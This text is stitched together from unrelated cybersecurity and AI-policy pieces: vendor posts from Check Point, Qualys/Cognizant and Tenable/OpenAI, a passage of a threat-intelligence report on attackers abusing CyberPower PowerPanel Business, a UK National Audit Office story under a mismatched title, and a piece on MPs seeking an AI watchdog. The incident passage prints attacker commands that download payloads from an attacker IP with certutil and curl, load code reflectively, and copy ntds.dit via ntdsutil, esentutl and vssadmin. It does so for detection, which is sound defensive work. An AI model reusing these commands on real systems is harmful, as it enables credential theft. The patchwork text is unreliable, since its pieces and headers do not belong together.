When attackers use AI to scan, adapt and exploit faster than human teams can respond, resilience requires prevention that can analyze threat intelligence and attack signals at scale.

ThreatCloud AI applies AI and global threat intelligence across Check Point protections to identify emerging threats.

AI-driven prevention helps controls adapt as techniques and infrastructure change.

AI-supported security operations help teams connect signals across the environment, shorten the time to answer “cyber or not?” and respond before an incident compounds existing disruption.

Whether the next outage is caused by an attacker or not, the organizations that recover best will be those that can keep protections in place, contain the impact and act quickly under uncertainty. That is what it means to treat resilience as part of security from the start.

Full Text:
Cognizant will use the full Qualys portfolio to bring its clients what the frontier AI era demands: AI-speed detection, hyper-prioritization, and confident remediation for every zero-day.

When a critical zero-day goes public, security leaders ask two questions: which assets are affected, and how fast can we safely fix them? For most enterprises, the current answer is days, then weeks.

Frontier AI makes that remediation timeframe dangerous. Microsoft’s November Patch Tuesday alone carried 1,093 vulnerabilities, up from 93 in November 2025 before frontier AI models arrived. AI-assisted attackers can weaponize a new advisory in four to twelve hours, while scan-driven detection often takes 24 to 36 hours just to show which assets are affected. The risk is already real: Cognizant’s 2026 Cybersecurity Pulse Poll found that 83% of participating U.S. enterprises had an AI-related security incident in the past 24 months.

Knowing what to fix is only half the gap. Every step from finding to fix is still gated by people, for one reason: fear that a patch will break production, that a reboot will take down a critical system, or that there is no fast way back. Teams will not hand fixes to automation they do not trust.

Cognizant helps the world’s largest enterprises scale with AI, through its AI Builder approach, and recognizes that its clients need security that moves at machine speed. Already running managed services on Qualys ETM, Cognizant is now expanding to the full Qualys portfolio, including TruRisk Eliminate. That is why I am excited to welcome Cognizant to the Qualys Global mROC Alliance.

Managed detection is table stakes. This is the dawn of the 24-hour autonomous remediation service, run from Qualys ETM: a zero-day disclosed, detected, prioritized, and remediated within a day.

Why the Qualys Platform Fits Cognizant’s Approach

Running zero-day response as a service, at enterprise scale, puts specific demands on the platform underneath. Cognizant needed three capabilities working as one:

One record for every asset, across every tool, built from Qualys and non-Qualys sources, so there is no reconciling data across disparate tools before anyone can act.

Exploit validation in each client’s own environment, so every hour of the client’s team’s time goes to risk that is real.

Remediation with confidence, so automation can be trusted within production systems.

Qualys delivers all three on one platform, with the agentic AI to run them at machine speed.

Cognizant brings what a platform alone cannot: Cyber Vulnerability Management services and threat intelligence, delivery experience inside large enterprises, and a view of risk in financial terms for the board. Its operators run the Risk Operations Center, powered by Qualys ETM to navigate inside each client’s own tools, change windows, and approvals. Clients keep control of what gets fixed and when. Cognizant carries the daily work.

“Our 2026 Cybersecurity Pulse Poll shows that strength in one control, such as detection or remediation, still leaves enterprises exposed in the AI era. Together with Qualys, we are connecting detection, prioritization and remediation into one managed operating model, helping clients reduce risk, strengthen resilience and scale AI with confidence.” — Vishal Salvi, SVP and Global Head of Cybersecurity, Cognizant

Cognizant will deliver four mROC services on the Qualys platform:

Cyber risk quantification and advisory services. Cyber risk for business applications shown in dollars, with a personalized risk plan and a report for the board.

Onboarding and integration. The security tools a customer already owns connected into one record for each asset, with data quality checked from day one.

Risk monitoring as a managed service. AI-speed alerts on new CVEs, a validated queue instead of noise, and a weekly exposure review, using InstaScan, Agent Val, and ROCky.

Risk remediation as a managed service. A wave-based plan built from the Risk Elimination Playbook, zero-touch remediation where it is safe, and proof the fix held, using TruRisk Eliminate, TruConfidence, and Agent Sara.

AI-Speed Detection: Every Exposure Known in Minutes

Frontier AI has changed the rhythm of disclosure. Vulnerabilities now land in volume, and attackers act on them in hours, well inside any scan cycle.

Qualys InstaScan, delivered by Agent Insta, closes that gap. It turns the inventory and telemetry a client already has, from Qualys and non-Qualys sources, into high-confidence findings within minutes of disclosure. No new scan, no new agent.

On November’s Patch Tuesday, InstaScan delivered 90% of detections within minutes. The first landed about 40 minutes before Microsoft’s own release notes went live. With Cognizant, that speed turns into action. Through its risk monitoring service, Cognizant analysts watch for new disclosures every day, confirm each exposure, and route it to the right asset owner with context. The client’s team no longer chases owners or rebuilds asset lists every time a new CVE trends.

Hyper-Prioritization: Proven Exploitability

More vulnerabilities do not mean more risk. Of the 48,172 vulnerabilities disclosed in 2025, the Qualys Threat Research Unit found only 357 (0.74%) confirmed remotely exploitable and actively weaponized. No team can work the full list, and none should have to.

Agent Val and TruConfirm test what is actually exploitable in the client’s own environment, with existing controls counted. Critical on paper but blocked by a control? It leaves the urgent queue. Exploitable on a PCI-scoped server? It goes to the top.

Cyber Risk Quantification (CRQ) then puts validated risk in dollars, by business application, so the CISO can show the board what each fix is worth.

With Cognizant, the short list becomes a working rhythm. Through its risk monitoring and advisory services, Cognizant keeps each client’s validated queue current and reviews it with them every week. The client’s team stops triaging noise and starts each week knowing exactly what to fix first.

Autonomous Remediation: Remediate with Confidence and Maintain Operational Resiliency

That fear is why the global mean time to remediate sits at about 30 days. TruRisk Eliminate, with TruConfidence, removes it by protecting operational resiliency before, during, and after every change.

Before: TruRisk Eliminate chooses the safest fix for each finding: patch, mitigate, isolate, or uninstall. A patch reliability score decides what deploys automatically and what goes ring by ring.

During: Changes roll out in waves, starting with low-risk rings. System health is watched through each wave, and rollback restores a known-good state if health drops.

After: AI-powered patch failure analysis pinpoints why a change failed and the corrective actions, and automated rollback restores a known-good state.

Showing clients the 1% that matters

Cognizant can open every client engagement with a Risk Elimination Playbook, powered by TruConfidence and built for that client’s environment. It narrows the backlog to the 1% that must be fixed now and moves the rest into planned software updates. It also benchmarks the client’s mean time to remediate against peers, and shows how much of the backlog autonomous remediation can close, and how much faster.

It becomes the plan behind every remediation wave and the baseline for every review.

Where Managed Security Goes Next

The three pillars together provide a new kind of service: 24-hour autonomous remediation, run from ETM. Cognizant can take a critical zero-day from disclosure to remediation within a day, for every client, with operational resiliency built in at every step.

Managed security is moving from raising alerts to closing risk. Cognizant is among the first to deliver that at enterprise scale, and I expect it to set the bar enterprises hold every provider to. That is what the Global mROC Alliance was built for: the platform, the certification path, and the operating model to run the Risk Operations Center as a service.

Attackers already move at AI speed. This expanded partnership helps tip the balance back toward the defense.

Title: Fix Tenable One findings where developers work: Tenable and OpenAI Daybreak Defense Factory
Context: OpenAI built the connector, one of the select supported integrations in the OpenAI Daybreak Defense Factory
Full Text:
Tenable One customers can now bring selected findings into OpenAI Daybreak Defense Factory through a local Codex Security CLI import with Tenable’s description and solution attached, so developers can fix them where they already work. OpenAI built the connector, one of the select supported integrations in the OpenAI Daybreak Defense Factory.

Key takeaways

Code security findings often lose their context in the handoff. Security teams pass code findings to developers as exports and tickets, and developers end up reinvestigating before they can fix anything.

Daybreak Defense Factory imports selected Tenable One findings. OpenAI built a Tenable One connector into Codex Security, which OpenAI publishes as open source. The connector reads findings through the Inventory Export API in Tenable One or from CSV exports. Each finding arrives in the local Codex Security workbench with its name, severity and state, plus Tenable’s description and solution.

You can try it today with OpenAI’s setup guide. Select a code repository and its findings in Tenable One, export them, then preview and import them into Codex Security against your local checkout of the repository.

Why code findings stall between security and development

A vulnerability often takes an indirect path from the security team that finds it to the developer who fixes it, and important context gets lost along the way. The security team sends the finding over as an export or a ticket, where a development team triages it. When a developer finally picks it up, they still have to work out which code is affected and what a good fix looks like before they can write a line of code to fix it. Most of that context already existed on the security side. It just didn’t make the trip.

We think the fix should start where the developer already works. That’s the idea behind Tenable One’s integration with OpenAI Daybreak Defense Factory: the security team selects findings in Tenable One, and the developer imports them locally with the Codex Security CLI, with Tenable’s description and solution attached when available. Each finding keeps its Tenable finding ID, and its file path and line number when the export includes them.

What Daybreak Defense Factory imports from Tenable One

The findings come from code repository assets in the Tenable One Exposure Management Platform inventory. Each one carries its name, severity, and state, along with Tenable’s description of the issue and Tenable’s solution.

After the import, the Daybreak Defense Factory is designed to help the developer investigate the affected code, decide which findings to prioritize, and propose a fix in the code.

Import Tenable One findings into your Defense Factory in four steps

To try it today, OpenAI’s setup guide walks you through a local command-line import:

Select the repository and findings. In the Tenable One inventory, open the Code Repository asset and copy its asset ID and the IDs of the findings you want to import.

Export the selection. Export the asset and findings through the Inventory Export API (for tenants on cloud.tenable.com), or start from existing CSV exports. The guide’s export helper checks that each finding belongs to the selected asset. If your export includes file paths and line numbers, the guide shows how to keep them in the import.

Preview, then save. Run codex-security publish findings --provider tenable with --dry-run against your local checkout to preview the import. When the preview looks right, run it again without --dry-run and confirm to save the findings.

Read the import back. Run codex-security findings imported to list what Codex Security saved, with each Tenable finding ID and the “not assessed” status that Codex Security gives it at the start.

To refresh the findings later, import again with the same --source-key value, a tenant alias, plus the asset ID. According to the guide, Codex Security updates the evidence for findings that changed and keeps identical findings as they are.

Get started

OpenAI’s setup guide has the full commands, the helper scripts, and the CSV formats.

Tenable One Exposure Management Platform (product page)

Context: Significance In this attack, we have seen how attackers abused the legitimate documented features of a widely used and trusted application, CyberPower’s PowerPanel Business...
Full Text:
Stage 3: Use the channel as a general remote shell

As expected, the attacker did not use their access for triggering actions from power events. Instead, they just used it to run arbitrary commands. Each command below was executed by the PPB service through cmd.exe.

Command run by ppbed.exe → cmd.exe

Purpose

certutil -urlcache -f http://84[.]200[.]205[.]145/ NUL

Test that the DC can reach the attacker's server

certutil -decode C:\Windows\Temp\dt.exe.b64 C:\Windows\Temp\dt.exe

Decode a staged binary

curl.exe -v -m 25 http://84[.]200[.]205[.]145:55557/junk50k.bin -o C:\Windows\Temp\junk.bin

Ingress Tool Transfer

certutil -hashfile C:\Windows\Temp\wupd.exe MD5

Verify a download

C:\Windows\Temp\hello.exe

Payload Execution

powershell -ep bypass -c "....EntryPoint.Invoke(…)" (from ppgxrte.cmd)

Reflective load of the same assembly

certutil -decode …\rs.b64 …\rs.ps1

Stage a PowerShell script

netstat -an

List connections

certutil -decode …\bde_l.b64 …\bde_local.ps1

Stage another PowerShell script

dt.exe, wupd.exe and hello.exe were each downloaded from hxxp://84[.]200[.]205[.]145:55556/ as dt.bin, wupd.bin and hello.bin. wupd.exe is detected as MSIL.Killav!gen1, a .NET antivirus killer. The base64 blob in the PowerShell command decodes to a 4,096-byte .NET PE, byte-identical to hello.exe (SHA-256 d8ae46604dc4eab411977764bd923af686aea117fb33304520d928f1d382ef0e), whose only function is to print a greeting. It serves as a test to show that the reflective-load path works.

Stage 4: Collect the Active Directory database, revising the scripts until it works

The attackers were seen iteratively developing their data collection scripts on the fly. Scripts were executed, and results logged and checked, before further changes were made and executed again. Several iterations were made until the script achieved the required results.

Script (staged via extcmd)

Purpose

ppskbcx.cmd

Exports a copy of the Active Directory database (ntds.dit) using ntdsutil

ppgxrte.cmd

Load an embedded .NET program into memory

ppgtpui.cmd

Changes to run in the background with output sent to a log file

ifm.cmd

The same ntdsutil export

ifm2.cmd

The same export, plus a log file and a “done” marker file

ifm3.cmd

The same export, with a timestamp, tool check, and exit code written to the log

ppotuff.cmd

Saves the SYSTEM registry hive, then copies ntds.dit from a shadow copy with esentutl

ifm4.cmd, ppinthw.cmd

Copy ntds.dit from a shadow copy with esentutl

The cycle of writing a script, uploading it, running it, checking results and then adjusting, bears the hallmarks of an interactive operation with a human at the keyboard. The pivot from ntdsutil ifm to esentutl /vss enables the attacker to copy a locked ntds.dit file via the Volume Shadow Copy service instead.

Stage 5: Launch an implant from the same channel

After the collection scripts are finished, PowerShell was used to start C:\Windows\System32\config\systemprofile\AppData\Local\50679f292a1\upnpcont.exe. The process lineage is: ppbed.exe → cmd.exe → powershell.exe → upnpcont.exe.

The file upnpcont.exe is a name associated with a Microsoft UPnP component. It does not belong to a SYSTEM profile directory. It was observed loading atl.dll from the same directory with an unknown reputation. This pattern of using an old, trusted executable paired with an unknown DLL in a user-profile path is the typical pattern of the DLL side-loading technique.

Processes spawned by the implant keep ppbed.exe as the root of their lineage. The command, vssadmin create shadow /for=C: and the later robocopy collection task ran from this chain: vssadmin.exe ← powershell.exe ← upnpcont.exe ← powershell.exe ← cmd.exe ← ppbed.exe ← services.exe.

Significance

In this attack, we have seen how attackers abused the legitimate documented features of a widely used and trusted application, CyberPower’s PowerPanel Business edition, to enable them to execute commands, while masquerading as the application itself. The command execution feature in its console enables admins to run scripts to handle power failures, but this feature is a double-edge sword that can be abused by attackers. It simply accepts a script, stores it, and runs it as SYSTEM through a signed service on a server that often sits in a privileged position.

In this case, the attacker's tooling was almost entirely reliant on built-in Windows tools (certutil, ntdsutil, esentutl, reg, vssadmin, robocopy, wmic), along with a side-loaded implant, so defenders need to check the parent process for a meaningful indicator.

What this attack shows is that UPS, power-management, and other infrastructure software should be treated like any other potentially dual-use RMM product; used with network restrictions, unique credentials, vigilant patching, and process-level monitoring.

While we have not attributed this activity to a known actor, the interactive development of a data collection script during the attack points to a threat actor with live-human presence at the keyboard. Motivations of the attackers are unclear as no exfiltration or final payload such as ransomware was seen.

Recommendations

Locate all PPB console instances and restrict TCP port 3052 to named administrator hosts. Do not expose it to the internet, other servers, or user networks.

Change the default administrator password, ensure patches are up to date

Audit extcmd and temp\profile\extcmd paths on every PPB host and compare them with the product defaults. Treat any unknown scripts as hostile and review the console's event-to-command assignments.

Review the techniques and indicators in this document. If you find them, assume Active Directory credentials are exposed and plan a krbtgt reset and wider credential rotation.

Treat machines running power-management software as high-value assets and defend accordingly.

Protection

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.

Indicators of Compromise

File indicators

22b8f2776f1c941d8240ee4243da537147f8d2ee4d859a68038335da7b0d7688 – ppskbcx.cmd (ntdsutil ifm)

04206431c83d1d81726e56fffb5166c0a7f138eb366e5aa918dee54af1ef22b5 – ppgtpui.cmd (ntdsutil ifm, background with log)

899f072c505e56ed65b4ea5d64ab3bc0f98c39366b2c413c988551843e729451 – ppgxrte.cmd (reflective .NET load)

76670eaadda9806c9aefa91c2ee4f2a33dcf8124574721a6ff072f19e7c03514 – pppwngl.cmd (reflective .NET load with try/catch)

Title: The Silent Consensus
Watchdog Warns UK Government Is Falling Short on Risk Management
Context: The spending watchdog published its report, Risk management in government: improving capability and decision making, on November 18
Full Text:
The number of chief risk officers (CROs) in UK government has more than doubled over the past decade, but most industry professionals working in Whitehall believe they lack influence, according to a new National Audit Office (NAO) report.

The spending watchdog published its report, Risk management in government: improving capability and decision making, on November 18.

It noted that effective risk management is important in helping to manage fast emerging risks, like the recent PHP vulnerabilities, which have the potential to disrupt public services and lead to costly recovery work.

It can also “help public bodies make better decisions, adapt to uncertainty and take well-managed risks to innovate and improve services,” the NAO argued.

However, 58% of risk professionals it polled claimed they are typically brought in too late to shape decisions.

“We found limited evidence of major decisions or organizational direction changing because of input from risk professionals,” the report noted. “In hierarchical organizations, the often low seniority of those leading risk teams can also restrict their access to senior decision-making forums.”

Read more on risk management: 75% CISOs Fear Executives Don’t Understand Cybersecurity Risks Employees Face

In the cyber sphere, a lack of skills and awareness are undermining efforts to embed risk more fully in decision making, the report found.

For example, Audit and Risk Assurance Committees (ARACs) should provide independent advice and challenge the board and accounting officer. But the report noted that “skills gaps among committee members in evolving areas such as cybersecurity” are constraining their effectiveness.

Additionally, leaders don’t always understand the cyber risks outlined in risk registers “or recognize how they relate to their strategic objectives,” the NAO said.

Many government departments are at least defining their risk appetite, but less than half (47%) of those polled said this actually informs decisions. In June 2026, most reported that the majority of their principal risks were outside their stated tolerance.

“Legacy technology and specialist staff shortages may constrain departments’ ability to bring cybersecurity risks within appetite,” the report noted.

In many cases, the result is that known risks aren’t being addressed promptly. The NAO highlighted the case of the British Library, which had already identified risks from growing third-party access to IT systems, but was breached before planned changes were implemented.

Risk Management Critical in Interconnected Environment

Progress is being made, but is uneven across government, with many bodies not making use of performance information, early warning indicators, or assurance mapping to monitor risk management efforts, the report argued.

This is more important than ever given today’s “complex and interconnected” risk environment, it said.

Only a continuous approach to risk monitoring and improvement will do, the NAO argued. This means ensuring risk registers are “robust and ‘living documents’ that reflect significant risks,” it said.

"The past few years have highlighted the scale and complexity of the risks facing government and how quickly they can escalate into crises, with lasting consequences for public services,” said Gareth Davies, head of the NAO.

“Whilst it has made good progress, the government must now put risk management at the heart of how it plans, spends and delivers, making sure that senior leaders are equipped to spot vulnerabilities early and to take well-manged risks to improve public services. This will become ever more important as more decisions and public spending are devolved.”

Title: UK MPs want AI watchdog with power to pull the plug on dangerous models
Context: Once some models are released, they cannot reliably be recalled," added Byrne
Full Text: UK MPs want a watchdog with the power to pull the plug on dangerous AI models, rather than leave the likes of OpenAI and Anthropic to decide when they've gone too far. In a report shared with The Register ahead of publication on Wednesday, a parliamentary committee is calling for an AI Safety and Security Bill that would give a watchdog powers to intervene while models are still being developed. It could halt high-risk training and testing, block deployments, or suspend AI services if the risks can't be contained. LLMs are trained on billions of learned parameters and so developers can't always predict what a model will do in every situation. The recommendations come from Parliament's Business, Innovation, Science and Trade Committee, which questioned researchers, former AI employees, and representatives from OpenAI, Google DeepMind, Anthropic, and Meta. All four companies assured MPs they wouldn't release models they considered unsafe. The trouble is, they don't use the same yardstick for safety, and UK law doesn't generally require them to get an independent opinion before releasing anything. "We cannot give today’s AI leaders unfettered freedom to behave like modern-day Dr Frankensteins, creating dangers beyond anyone’s control," said committee chair Liam Byrne MP. Just as with aviation, pharma or nuclear safety, UK government want to rely on manufacturers' assurance alone, and want regulation. "Our hearings exposed gaps in independent scrutiny, incident reporting and powers to stop unsafe systems. Once some models are released, they cannot reliably be recalled," added Byrne. "Protection must begin while systems are being built and tested." The committee's report, Guardrails for Growth: Making AI Safe, identifies ten holes in Britain's approach to AI safety, including the lack of mandatory incident reporting, limited access for independent testers, and inadequate protections for whistleblowers. The UK already has an AI Security Institute (AISI), which has made a name for itself testing some of the world's most powerful models, but its work depends on voluntary cooperation, and it has no authority to stop a company releasing a model that raises safety concerns. MPs want AISI to continue its testing work while a separate regulator takes responsibility for enforcement. Developers of designated high-risk systems would have to provide evidence supporting their safety claims and give independent researchers access to examine them. Significant changes to a model's capabilities or safeguards would trigger further scrutiny. Former AI employees also told MPs that raising safety concerns can come at a price. Restrictive contracts, commercial pressures, and financial disincentives can all discourage staff from speaking out, the committee heard. MPs want stronger legal protections for whistleblowers and compulsory reporting of AI incidents and near misses. There's a fair bit of money riding on this, too. Using OECD productivity estimates, the committee calculates that AI could leave Britain's economy up to £400 billion larger over the next decade. It also sees an opportunity for the UK to make money from independently testing AI models, building on the expertise already established at AISI. MPs argue that stronger safeguards could encourage businesses, particularly smaller firms, to adopt the technology. "AI firms must be required to substantiate their safety claims, independent experts must be able to scrutinize them, and a regulator must have the power to intervene when risks cannot be controlled," Byrne said. "Ministers, accountable to Parliament, must decide what risks the public should be asked to bear." MPs want the new laws on the books in the next parliamentary session, and say Britain should use its turn at the G20 helm in 2027 to get other countries on board with tougher rules for AI testing, incident reporting, and risky model releases. Whether ministers are prepared to hand a watchdog the power to stop AI development is another matter. The committee's recommendations aren't binding, and the government has yet to commit to the proposed legislation. ®
